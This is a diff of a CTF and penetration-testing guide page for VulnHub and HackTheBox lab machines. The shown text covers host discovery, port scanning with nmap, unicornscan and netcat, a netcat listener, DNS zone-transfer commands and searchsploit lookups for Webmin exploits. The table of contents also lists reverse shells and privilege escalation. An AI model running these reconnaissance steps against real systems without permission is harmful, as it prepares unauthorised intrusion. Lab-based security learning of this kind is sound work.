@@ -58,7 +58,7 @@
 </li>
 <li><a class="reference internal" href="#port-scanning">Port Scanning</a><ul>
 <li><a class="reference internal" href="#unicornscan">Unicornscan</a></li>
-<li><a class="reference internal" href="#id3">Nmap</a></li>
+<li><a class="reference internal" href="#id4">Nmap</a></li>
 <li><a class="reference internal" href="#netcat">netcat</a><ul>
 <li><a class="reference internal" href="#tcp-scan">TCP Scan</a></li>
 <li><a class="reference internal" href="#udp-scan">UDP Scan</a></li>
@@ -80,11 +80,12 @@
 <li><a class="reference internal" href="#webservices">Webservices</a><ul>
 <li><a class="reference internal" href="#whatweb">whatweb</a></li>
 <li><a class="reference internal" href="#nikto">nikto</a></li>
-<li><a class="reference internal" href="#burpsuite-spider">BurpSuite Spider</a></li>
 <li><a class="reference internal" href="#dirb-wfuzz-dirbuster">dirb, wfuzz, dirbuster</a></li>
+<li><a class="reference internal" href="#burpsuite-spider">BurpSuite Spider</a></li>
+<li><a class="reference internal" href="#parameter-fuzz">Parameter Fuzz?</a></li>
 <li><a class="reference internal" href="#put-method">PUT Method</a></li>
 <li><a class="reference internal" href="#wordpress">Wordpress</a></li>
-<li><a class="reference internal" href="#names-possible-usernames-possible-passwords">Names? Possible Usernames? Possible Passwords?</a></li>
+<li><a class="reference internal" href="#names-possible-usernames-passwords">Names? Possible Usernames &amp; Passwords?</a></li>
 <li><a class="reference internal" href="#brute-forcing-hydra">Brute forcing: hydra</a></li>
 </ul>
 </li>
@@ -103,18 +104,19 @@
 <li><a class="reference internal" href="#lynx">Lynx</a></li>
 <li><a class="reference internal" href="#mysql">MYSQL</a></li>
 <li><a class="reference internal" href="#reverse-shell-from-windows">Reverse Shell from Windows</a></li>
+<li><a class="reference internal" href="#msf-meterpreter-elf">MSF Meterpreter ELF</a></li>
 <li><a class="reference internal" href="#metasploit-msfvenom">Metasploit MSFVenom</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#spawning-a-tty-shell">Spawning a TTY Shell</a><ul>
-<li><a class="reference internal" href="#id8">Python</a></li>
+<li><a class="reference internal" href="#id9">Python</a></li>
 <li><a class="reference internal" href="#sh">sh</a></li>
-<li><a class="reference internal" href="#id9">Perl</a></li>
-<li><a class="reference internal" href="#id10">Ruby</a></li>
+<li><a class="reference internal" href="#id10">Perl</a></li>
+<li><a class="reference internal" href="#id11">Ruby</a></li>
 <li><a class="reference internal" href="#lua">Lua</a></li>
 <li><a class="reference internal" href="#irb">IRB</a></li>
 <li><a class="reference internal" href="#vi">VI</a></li>
-<li><a class="reference internal" href="#id11">Nmap</a></li>
+<li><a class="reference internal" href="#id12">Nmap</a></li>
 <li><a class="reference internal" href="#expect">Expect</a></li>
 <li><a class="reference internal" href="#sneaky-stealthy-su-in-web-shells">Sneaky Stealthy SU in (Web) Shells</a></li>
 </ul>
@@ -145,7 +147,7 @@
 </li>
 </ul>
 </li>
-<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged shell to privileged shell</a><ul>
+<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell">Unprivileged Shell to Privileged Shell</a><ul>
 <li><a class="reference internal" href="#windows-privilege-escalation">Windows Privilege Escalation</a><ul>
 <li><a class="reference internal" href="#systeminfo">SystemInfo</a></li>
 <li><a class="reference internal" href="#metasploit-local-exploit-suggestor">Metasploit Local Exploit Suggestor</a></li>
@@ -197,12 +199,33 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#tips-and-tricks">Tips and Tricks</a><ul>
-<li><a class="reference internal" href="#ftp-services">FTP Services</a><ul>
+<li><a class="reference internal" href="#windows">Windows</a><ul>
+<li><a class="reference internal" href="#get-childitem-mode-values">Get-ChildItem Mode Values</a></li>
+<li><a class="reference internal" href="#zip-or-unzip-using-only-windows-built-in-capabilities">Zip or unzip using ONLY Windows’ built-in capabilities?</a></li>
+<li><a class="reference internal" href="#alternate-data-stream">Alternate Data Stream</a></li>
+<li><a class="reference internal" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process">Redirecting Standard Out and Standard Error from PowerShell Start-Process</a></li>
+<li><a class="reference internal" href="#ntds-dit-and-system-hive">NTDS.dit and SYSTEM hive</a></li>
+<li><a class="reference internal" href="#icmp-shell">ICMP Shell</a></li>
+<li><a class="reference internal" href="#recovering-password-from-system-security-securestring">Recovering password from System.Security.SecureString</a></li>
+<li><a class="reference internal" href="#copy-to-or-from-a-powershell-session">Copy To or From a PowerShell Session</a></li>
+<li><a class="reference internal" href="#get-hash">Get-Hash</a></li>
+<li><a class="reference internal" href="#active-directory-enumeration-and-remote-code-execution">Active Directory Enumeration and Remote Code Execution</a></li>
+<li><a class="reference internal" href="#others">Others</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#wget">Wget</a><ul>
+<li><a class="reference internal" href="#ftp-via-wget">FTP via Wget</a></li>
 <li><a class="reference internal" href="#wgetrc-commands">wgetrc Commands</a></li>
+<li><a class="reference internal" href="#tricks">Tricks</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#ssh">SSH</a><ul>
 <li><a class="reference internal" href="#ssh-config">ssh_config</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#ssh-tunneling">SSH Tunneling</a><ul>
+<li><a class="reference internal" href="#local-port-forwarding">Local Port Forwarding</a></li>
+<li><a class="reference internal" href="#remote-port-forwarding">Remote Port Forwarding</a></li>
 <li><a class="reference internal" href="#ssh-as-socks-proxy">SSH as SOCKS Proxy</a></li>
 </ul>
 </li>
@@ -217,14 +240,7 @@
 <li><a class="reference internal" href="#login-pages">Login-Pages</a></li>
 <li><a class="reference internal" href="#delete-tags">Delete Tags</a></li>
 <li><a class="reference internal" href="#http-404-custom-page">HTTP 404 Custom Page</a></li>
-<li><a class="reference internal" href="#id17">PHP</a></li>
-</ul>
-</li>
-<li><a class="reference internal" href="#run-parts">run-parts</a></li>
-<li><a class="reference internal" href="#sudoers-file">Sudoers file</a><ul>
-<li><a class="reference internal" href="#secure-path">secure_path</a></li>
-<li><a class="reference internal" href="#env-reset">env_reset</a></li>
-<li><a class="reference internal" href="#mail-badpass">mail_badpass</a></li>
+<li><a class="reference internal" href="#id20">PHP</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#docker-security">Docker Security</a><ul>
@@ -233,15 +249,6 @@
 <li><a class="reference internal" href="#become-root">Become root?</a></li>
 </ul>
 </li>
-<li><a class="reference internal" href="#java-keystore-file">Java keystore file</a></li>
-<li><a class="reference internal" href="#cracking-md5-hashes">Cracking MD5 Hashes</a></li>
-<li><a class="reference internal" href="#steghide">Steghide</a></li>
-<li><a class="reference internal" href="#git-client-privilege-escalation">Git client Privilege Escalation</a><ul>
-<li><a class="reference internal" href="#git-ssh">GIT_SSH</a></li>
-<li><a class="reference internal" href="#git-template-dir">GIT_TEMPLATE_DIR</a></li>
-</ul>
-</li>
-<li><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
 <li><a class="reference internal" href="#password-protected-file">Password Protected File</a><ul>
 <li><a class="reference internal" href="#zip-file">ZIP File</a></li>
 <li><a class="reference internal" href="#rar2john">rar2john</a></li>
@@ -255,18 +262,31 @@
 <li><a class="reference internal" href="#seccure-elliptic-curve-crypto-utility-for-reliable-encryption">SECCURE Elliptic Curve Crypto Utility for Reliable Encryption</a></li>
 </ul>
 </li>
-<li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
-<li><a class="reference internal" href="#windows">Windows</a><ul>
-<li><a class="reference internal" href="#get-childitem-mode-values">Get-ChildItem Mode Values</a></li>
-<li><a class="reference internal" href="#zip-or-unzip-using-only-windows-built-in-capabilities">Zip or unzip using ONLY Windows’ built-in capabilities?</a></li>
-<li><a class="reference internal" href="#alternate-data-stream">Alternate Data Stream</a></li>
-<li><a class="reference internal" href="#redirecting-standard-out-and-standard-error-from-powershell-start-process">Redirecting Standard Out and Standard Error from PowerShell Start-Process</a></li>
-<li><a class="reference internal" href="#ntds-dit-and-system-hive">NTDS.dit and SYSTEM hive</a></li>
-<li><a class="reference internal" href="#icmp-shell">ICMP Shell</a></li>
+<li><a class="reference internal" href="#network-information">Network Information</a><ul>
+<li><a class="reference internal" href="#ip">ip</a></li>
+<li><a class="reference internal" href="#hostname">hostname</a></li>
+<li><a class="reference internal" href="#ss">ss</a></li>
 </ul>
 </li>
+<li><a class="reference internal" href="#sudoers-file">Sudoers file</a><ul>
+<li><a class="reference internal" href="#secure-path">secure_path</a></li>
+<li><a class="reference internal" href="#env-reset">env_reset</a></li>
+<li><a class="reference internal" href="#mail-badpass">mail_badpass</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#run-parts">run-parts</a></li>
+<li><a class="reference internal" href="#java-keystore-file">Java keystore file</a></li>
+<li><a class="reference internal" href="#cracking-md5-hashes">Cracking MD5 Hashes</a></li>
+<li><a class="reference internal" href="#steghide">Steghide</a></li>
+<li><a class="reference internal" href="#git-client-privilege-escalation">Git client Privilege Escalation</a><ul>
+<li><a class="reference internal" href="#git-ssh">GIT_SSH</a></li>
+<li><a class="reference internal" href="#git-template-dir">GIT_TEMPLATE_DIR</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#metasploit-shell-upgrade">Metasploit shell upgrade</a></li>
+<li><a class="reference internal" href="#truecrypt-files">Truecrypt Files</a></li>
 <li><a class="reference internal" href="#grep-in-input-box">Grep in input box?</a></li>
-<li><a class="reference internal" href="#others">Others</a></li>
+<li><a class="reference internal" href="#id23">Others</a></li>
 </ul>
 </li>
 <li><a class="reference internal" href="#cyber-deception">Cyber-Deception</a><ul>
@@ -298,7 +318,7 @@
 </li>
 </ul>
 </li>
-<li><a class="reference internal" href="#appendix-ii-file-upload">Appendix-II File Upload</a><ul>
+<li><a class="reference internal" href="#appendix-ii-file-upload">Appendix-II : File Upload</a><ul>
 <li><a class="reference internal" href="#examples">Examples</a><ul>
 <li><a class="reference internal" href="#simple-file-upload">Simple File Upload</a></li>
 <li><a class="reference internal" href="#simple-file-upload-with-verifying-image-type">Simple File Upload - With verifying image type</a></li>
@@ -339,31 +359,33 @@
             
   <div class="section" id="ctf-series-vulnerable-machines">
 <h1>CTF Series : Vulnerable Machines<a class="headerlink" href="#ctf-series-vulnerable-machines" title="Permalink to this headline">¶</a></h1>
-<p>This post (Work in Progress) mark downs the learning gathered by doing the vulnerable machines provided by the <a class="reference external" href="https://vulnhub.com">VulnHub</a> , <a class="reference external" href="https://hackthebox.eu">Hack the Box</a> and others. Once you download the virtual machine from the website and run it in VMware or Virtual Box, below steps could be followed to find the vulnerabilities.</p>
-<p>We would like to <strong>thank g0tm1lk</strong> for maintaining <strong>Vulnhub</strong> and <strong>moderators</strong> of <strong>HackTheBox</strong>. Also, <strong>shout-out</strong> to each and every <strong>author of the Vulnerable Machine/ write-ups</strong> submitted. Thank you for providing awesome challenges to learn from and sharing your knowledge to the community!. <strong>Thank You!!</strong></p>
-<p>In solving any vulnerable machine, there are few stages:</p>
+<p>This post (Work in Progress) records what we learned by doing vulnerable machines provided by <a class="reference external" href="https://vulnhub.com">VulnHub</a>, <a class="reference external" href="https://hackthebox.eu">Hack the Box</a> and others. The steps below could be followed to find vulnerabilities, exploit these vulnerablities and finally become system/ root.</p>
+<p>Once you download a virtual machines from <a class="reference external" href="https://vulnhub.com">VulnHub</a>  you can run it by using virtualization software such as VMware or Virtual Box.</p>
+<p>We would like to <strong>thank g0tm1lk</strong> for maintaining <strong>Vulnhub</strong> and the <strong>moderators</strong> of <strong>HackTheBox</strong>. Also, <strong>shout-outs</strong> are in order for each and every <strong>authors of Vulnerable Machines and/ or write-ups</strong>. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! <strong>Thank You!!</strong></p>
+<p>You generally go through the following stages when solving a vulnerable machine:</p>
 <ul class="simple">
 <li><a class="reference internal" href="#finding-the-ip-address"><span class="std std-ref">Finding the IP address</span></a></li>
 <li><a class="reference internal" href="#port-scanning"><span class="std std-ref">Port Scanning</span></a></li>
 <li><a class="reference internal" href="#rabbit-holes"><span class="std std-ref">Rabbit Holes?</span></a></li>
 <li><a class="reference internal" href="#from-nothing-to-unprivileged-shell"><span class="std std-ref">From Nothing to a Unprivileged Shell</span></a></li>
-<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged shell to privileged shell</span></a></li>
+<li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged Shell to Privileged Shell</span></a></li>
 </ul>
-<p>In this blog, we have mentioned, what can be done in each stages. Have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving the VMs. <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could also be referred for exploitation of any particular services (As, it provides information such as “If you have found service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). There are also appendix related to <a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a> and <a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II File Upload</span></a></p>
+<p>On this blog, we have mentioned, what can be done in each stages. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to <a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a> and <a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a>.</p>
 <div class="section" id="finding-the-ip-address">
-<span id="id1"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
+<span id="id2"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
+<p>Before, exploiting any machine, we need to figure out it IP address.</p>
 <div class="section" id="netdiscover">
 <h3>Netdiscover<a class="headerlink" href="#netdiscover" title="Permalink to this headline">¶</a></h3>
 <p>An active/ passive arp reconnaissance tool</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>netdiscover [options]
--i interface : The network interface to sniff and inject packets.
--r range : Scan a given range instead of auto scan.
+-i interface : The network interface to sniff and inject packets on.
+-r range : Scan a given range instead performing an auto scan.
 
 Example:
 netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24
 </pre></div>
 </div>
-<p>Interface name for Virtualization Software</p>
+<p>Interface names of common Virtualization Software:</p>
 <ul class="simple">
 <li>Virtualbox : vboxnet</li>
 <li>Vmware     : vmnet</li>
@@ -376,36 +398,37 @@ netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24
 -sP/-sn Ping Scan -disable port scan
 </pre></div>
 </div>
-<p>Example</p>
+<p>Example:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nmap -sP/-sn 192.168.1.0/24
 </pre></div>
 </div>
 </div>
 </div>
 <div class="section" id="port-scanning">
-<span id="id2"></span><h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h2>
-<p>Port scanning provides a large amount of information on open services and possible exploits that target these services. Three options: Unicornscan, nmap, netcat (when nmap is not available).</p>
+<span id="id3"></span><h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h2>
+<p>Port scanning provides a large amount of information on open services and possible exploits that target these services.</p>
+<p>Common port scanning software include: Unicornscan, nmap, netcat (when nmap is not available).</p>
 <div class="section" id="unicornscan">
 <h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
-<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run a asynchronous scans. Faster than nmap and can scan 65,535 ports in a relatively shorter time frame.</p>
+<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively shorter time frame (faster than nmap).</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
   -i, --interface : interface name, like eth0 or fxp1, not normally required
   -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
-  Address ranges are cidr like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask then /32 is implied.
-  Port ranges are like 1-4096 with 53 only scanning one port, a for all 65k and p for 1-1024
+  Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
+  Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
 
- example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for gateway.
+ example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
 </pre></div>
 </div>
 </div>
-<div class="section" id="id3">
-<h3>Nmap<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="id4">
+<h3>Nmap<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
 <p>Network exploration tool and security/ port scanner</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nmap [Scan Type] [Options] {target specification}
 
 HOST DISCOVERY:
 -sL: List Scan - simply list targets to scan
--sn: Ping Scan - disable port scan
+-sn/-sP: Ping Scan - disable port scan
 -Pn: Treat all hosts as online -- skip host discovery
 
 SCAN TECHNIQUES:
@@ -426,15 +449,14 @@ OUTPUT:
 MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
 </pre></div>
 </div>
-<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
-<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine what application is running.</p>
+<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
 </div>
 <div class="section" id="netcat">
 <h3>netcat<a class="headerlink" href="#netcat" title="Permalink to this headline">¶</a></h3>
-<p>Netcat might not be the best tool to use for port scanning, but can be used quickly. netcat scans TCP ports by default, but we can perform UDP scans as well.</p>
+<p>Netcat might not be the best tool to use for port scanning, but it can be used quickly. Netcat scans TCP ports by default, but we can perform UDP scans as well.</p>
 <div class="section" id="tcp-scan">
 <h4>TCP Scan<a class="headerlink" href="#tcp-scan" title="Permalink to this headline">¶</a></h4>
-<p>For a TCP scan, the format is</p>
+<p>For a TCP scan, the format is:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nc -vvn -z xxx.xxx.xxx.xxx startport-endport
    -z flag is Zero-I/O mode (used for scanning)
    -vv will provide verbose information about the results
@@ -444,7 +466,7 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 </div>
 <div class="section" id="udp-scan">
 <h4>UDP Scan<a class="headerlink" href="#udp-scan" title="Permalink to this headline">¶</a></h4>
-<p>For a UDP Port Scan, we need to add -u flag which makes the format</p>
+<p>For a UDP Port Scan, we need to add -u flag which makes the format:</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nc -vvn -u -z xxx.xxx.xxx.xxx startport-endport
 </pre></div>
 </div>
@@ -453,7 +475,8 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 </div>
 <div class="section" id="amap-application-mapper">
 <h3>Amap - Application mapper<a class="headerlink" href="#amap-application-mapper" title="Permalink to this headline">¶</a></h3>
-<p>By using <strong>amap</strong>, we can identify if any SSL server is running on port 3445 or some oracle listener on port 23. Also, it will actually do an SSL connect if you want and then try to identify the SSL-enabled protocol! One of the VM in vulnhub was running http and https on the same port.</p>
+<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.</p>
+<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445? or some oracle listener on port 23?. Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect following by trying to identify the SSL-enabled protocol!  One of the vulnhub VM’s for example was running http and https on the same port.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>amap -A 192.168.1.2 12380
 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
 Protocol on 192.168.1.2:12380/tcp matches http
@@ -467,19 +490,21 @@ amap v5.4 finished at 2016-08-10 05:48:16
 </div>
 </div>
 <div class="section" id="rabbit-holes">
-<span id="id4"></span><h2>Rabbit Holes?<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
-<p>There would be instances where you are not able to find anything such as any open port or any entry point. The below may provide some clue.</p>
+<span id="id5"></span><h2>Rabbit Holes?<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
+<p>There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues how to get unstuck.</p>
 <div class="section" id="listen-to-the-interface">
-<span id="id5"></span><h3>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h3>
-<p>We should always listen to the local interface on which the VM is hosted such as vboxnet0 or vmnet using wireshark or tcpdump. Many VMs send data randomly, for example, In one of the VM, it does the arp scan and sends a SYN packet on the port 4444, if something is listening on that port, it send the data.</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
+<span id="id6"></span><h3>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h3>
+<p>Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>tcpdump -i eth0
+
+18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S], seq 861815232, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 4127458640 ecr 0], length 0
 18:02:04.096330 IP 192.168.56.1.4444 &gt; 192.168.56.101.36327: Flags [R.], seq 0, ack 861815233, win 0, length 0
 18:02:04.098584 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
 18:02:04.100773 ARP, Request who-has 192.168.56.3 tell 192.168.56.101, length 28
 18:02:04.096292 IP 192.168.56.101.36327 &gt; 192.168.56.1.4444: Flags [S],
 </pre></div>
 </div>
-<p>While listening on port 4444, we might receive a something like a base64 encoded string or some message.</p>
+<p>While listening on port 4444, we might receive something like a base64 encoded string or some message.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>nc -lvp 4444
 listening on [any] 4444 …
 192.168.56.101: inverse host lookup failed: Unknown host
@@ -490,7 +515,7 @@ connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 39519
 </div>
 <div class="section" id="dns-server">
 <h3>DNS Server<a class="headerlink" href="#dns-server" title="Permalink to this headline">¶</a></h3>
-<p>If the targeted machine is running a DNS Server and we have possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.</p>
+<p>If the targeted machine is running a DNS Server and we have a possible domain name, we may try to figure out A, MX, AAAA records or try zone-transfer to figure out other possible domain names.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>host &lt;domain&gt; &lt;optional_name_server&gt;
 host -t ns &lt;domain&gt;                -- Name Servers
 host -t a &lt;domain&gt;                 -- Address
@@ -499,12 +524,15 @@ host -t mx &lt;domain&gt;                -- Mail Servers
 host -t soa &lt;domain&gt;               -- Start of Authority
 host &lt;IP&gt;                          -- Reverse Lookup
 host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
+
+**todo add output example**
 </pre></div>
 </div>
 </div>
 <div class="section" id="ssl-certificate">
 <h3>SSL Certificate<a class="headerlink" href="#ssl-certificate" title="Permalink to this headline">¶</a></h3>
-<p>If the targetted machine is running https server and we are getting a apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, probably, check the alt-dns-name on the ssl-certificate, create a entry in /etc/hosts and browse with the <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
+<p>If the targetted machine is running an https server and we are getting a apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>. vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file ( /etc/hosts ) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
+<p>nmap service scan result for port 443 (sample)</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>| ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
 | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com
 </pre></div>
@@ -513,11 +541,11 @@ host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
 </div>
 <div class="section" id="from-nothing-to-a-unprivileged-shell">
 <span id="from-nothing-to-unprivileged-shell"></span><h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Permalink to this headline">¶</a></h2>
-<p>At this point, you would have an idea about the different services and service version running on the system. (aka figure out what webservices such as cms or software’s are running on the vulnerable machine)</p>
+<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by the nmap. It is also recommended to check what software is being used on the webservers (eg certain cms’s)</p>
 <div class="section" id="searchsploit">
 <h3>searchsploit<a class="headerlink" href="#searchsploit" title="Permalink to this headline">¶</a></h3>
 <p>Exploit Database Archive Search</p>
-<p>First, we need to check if the operating system is using any services which are vulnerable or the exploit is already available in the internet. For example, A vulnerable service webmin is present in one of the VM which can be exploited to extract information from the system.</p>
+<p>First, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VM which could be exploited to extract information from the system.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>root@kali:~# nmap -sV -A 172.16.73.128
 **********Trimmed**************
 10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
@@ -528,7 +556,7 @@ host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
 **********Trimmed**************
 </pre></div>
 </div>
-<p>If we search for webmin in searchsploit, we will find different exploits available for it and we just have to use the correct one based on the utility and the version matching.</p>
+<p>If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the version matching.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>root@kali:~# searchsploit webmin
 **********Trimmed**************
 Description                                                                            Path
@@ -543,7 +571,7 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 <div class="highlight-None"><div class="highlight"><pre><span></span>searchsploit -x 24674
 </pre></div>
 </div>
-<p>Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Need nmap -sV -x xmlfile ).</p>
+<p>Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Requires nmap -sV -x xmlfile ).</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>searchsploit
      --nmap     [file.xml]  Checks all results in Nmap&#39;s XML output with service version (e.g.: nmap -sV -oX file.xml).
                             Use &quot;-v&quot; (verbose) to try even more combinations
@@ -551,23 +579,23 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 </div>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">If we don’t get a exact exploit for a version, it is also recommended to read the exploits which are highlighted as they may be valid for lower versions too. For example Let’s say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it’s valid for lower versions too.</p>
+<p class="last">If we don’t manage to find an exploit for a specific version, it is recommended to check the notes of the exploits which are highlighted as they may be valid for lower versions too. For example Let’s say we are searching for exploits in Example_Software version 2.1.3. However, version 2.2.2 contains multiple vulnerablities. Reading the description for 2.2.2 we find out it’s valid for lower versions too.</p>
 </div>
 </div>
 <div class="section" id="seclists-org-security-mailing-list-archive">
 <h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
-<p>There would be some days, when you won’t find vulnerability in searchsploit. We should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug for that particular software.</p>
